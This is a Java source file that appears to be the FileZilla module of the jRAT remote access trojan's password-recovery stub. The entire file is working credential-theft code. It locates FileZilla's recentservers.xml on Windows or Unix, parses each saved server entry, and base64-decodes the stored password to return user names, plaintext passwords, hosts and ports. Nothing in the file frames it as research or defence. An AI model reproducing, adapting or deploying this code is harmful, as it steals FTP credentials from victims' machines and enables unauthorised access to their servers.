package jrat.plugin.recovery.stub.programs;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import sun.misc.BASE64Decoder;

import com.redpois0n.oslib.OperatingSystem;

public class FileZilla extends AbstractRecoverer {

	@Override
	public List<String[]> recover() throws Exception {
		List<String[]> list = new ArrayList<String[]>();

		File file = null;
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");
		} else {
			file = new File(System.getProperty("user.home") + "/.filezilla/recentservers.xml");
		}

		if (file != null && file.exists()) {
			DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
			DocumentBuilder db = dbf.newDocumentBuilder();
			Document doc = db.parse(file);
			doc.getDocumentElement().normalize();

			NodeList nList = doc.getElementsByTagName("Server");
			for (int temp = 0; temp < nList.getLength(); temp++) {
				Node n = nList.item(temp);
				if (n.getNodeType() == Node.ELEMENT_NODE) {
					Element e = (Element) n;

					String host = getTagValue("Host", e);
					String port = getTagValue("Port", e);
					String username = getTagValue("User", e);
					String password = getTagValue("Pass", e);
					
					try {
						password = new String(new BASE64Decoder().decodeBuffer(password));
					} catch (Exception ex) {
						ex.printStackTrace();
					}

					list.add(new String[] { username, password, host + ":" + port });
				}
			}
		}

		return list;
	}

	private static String getTagValue(String tag, Element e) {
		NodeList list = e.getElementsByTagName(tag).item(0).getChildNodes();
		Node node = (Node) list.item(0);
		return node == null ? "" : node.getNodeValue();
	}
	
	@Override
	public String getName() {
		return "FileZilla";
	}

}
